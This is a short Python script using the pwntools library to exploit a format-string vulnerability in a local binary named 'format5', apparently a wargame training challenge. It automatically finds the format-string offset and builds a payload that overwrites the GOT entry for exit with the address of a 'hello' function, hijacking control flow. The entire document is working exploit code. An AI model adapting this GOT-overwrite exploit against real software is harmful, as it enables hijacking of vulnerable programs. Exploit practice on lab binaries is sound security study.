#!/usr/bin/python
from pwn import *

e = elf.ELF('./format5')

hello_addr = e.symbols['hello']
exit_addr = e.got['exit']


def exec_fmt(payload):
    p = process('./format5')
    log.info("payload = {}".format(repr(payload)))
    p.sendline(payload)
    r = p.recvall()
    log.info("response = {}".format(r))
    return r #p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
p = process('./format5')
log.info('writing 0x{:08x}(hello addr) in 0x{:08x}(exit got)'.format(hello_addr, exit_addr))
payload = fmtstr_payload(offset, {exit_addr: hello_addr})
log.info("payload = {}".format(repr(payload)))
p.sendline(payload)
print p.recvall()
